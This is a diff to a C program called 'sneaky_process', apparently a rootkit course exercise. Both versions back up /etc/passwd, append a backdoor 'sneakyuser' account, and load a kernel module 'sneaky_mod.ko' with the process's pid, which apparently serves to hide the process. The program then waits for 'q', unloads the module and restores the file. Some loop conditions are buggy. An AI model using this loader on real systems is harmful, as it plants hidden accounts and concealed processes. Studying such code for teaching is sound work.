@@ -1,36 +1,64 @@
+#include <linux/module.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/types.h>
-#include <sys/wait.h>
+#include <sys/syscall.h>
 #include <unistd.h>
 
-int main(){
-    int pid = getpid();
-    //1: print own process ID
-    printf("sneaky_process pid = %d\n", pid);
+int main() {
+  int pid = getpid();
+  char pidstr[10];
+  sprintf(pidstr, "%d", pid);
+  printf("sneaky_process pid = %d, %s\n", pid, pidstr);
 
-    //2: copy /etc/passwd to /tmp/passwd, print a new line to the end of /etc/passwd
-    system("cp /etc/passwd /tmp");
-    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
+  FILE * f = fopen("/etc/passwd", "r+");
+  FILE * fd = fopen("/tmp/passwd", "w");
 
-    //3: load the sneaky module
-    char command[50];
-    sprintf(command, "insmod sneaky_mod.ko pid=%d", pid);
-    system(command);
+  // contrast
+  //  FILE * fdd = fopen("test.txt", "w");
 
-    //4: enter a loop, reading a char at a time until a 'q' is received
-    char input;
-    while(1){
-        if((input = getchar())!='q'){
-            break;
-        }
-    }
+  size_t sz = 0;
+  ssize_t len = 0;
+  char * line = NULL;
 
-    //5: unload the sneaky module: rmmod [modulename]
-    system("rmmod sneaky_mod.ko");
+  while (len = (getline(&line, &sz, f)) >= 0) {
+    // printf("%s", line);
+    fprintf(fd, "%s", line);
+    // fprintf(fdd, "%s", line);
+  }
 
-    //6: restore the /etc/passwd file
-    system("cp /tmp/passwd /etc");
+  fprintf(f, "%s", "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
+  // fprintf(fdd, "%s", "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
+  free(line);
+  fclose(f);
+  fclose(fd);
+  // fclose(fdd);
+  printf("sneaky passwordy stuff done\n");
+  char insn1[64];
+  sprintf(insn1, "insmod sneaky_mod.ko pid=%d pidstr=%s", pid, pidstr);
+  system(insn1);
+  char q;
 
-    return EXIT_SUCCESS;
+  while (q = (getchar()) != 'q') {
+    continue;
+  }
+  system("rmmod sneaky_mod");
+  f = fopen("/etc/passwd", "w");
+  fd = fopen("/tmp/passwd", "r");
+  // fdd = fopen("test.txt", "w");
+
+  sz = 0;
+  len = 0;
+  line = NULL;
+
+  while (len = (getline(&line, &sz, fd)) >= 0) {
+    //  printf("%s", line);
+    fprintf(f, "%s", line);
+    // fprintf(fdd, "%s", line);
+  }
+  free(line);
+  fclose(f);
+  fclose(fd);
+  // fclose(fdd);
+
+  printf("sneaky passwordy stuff undone\n");
 }
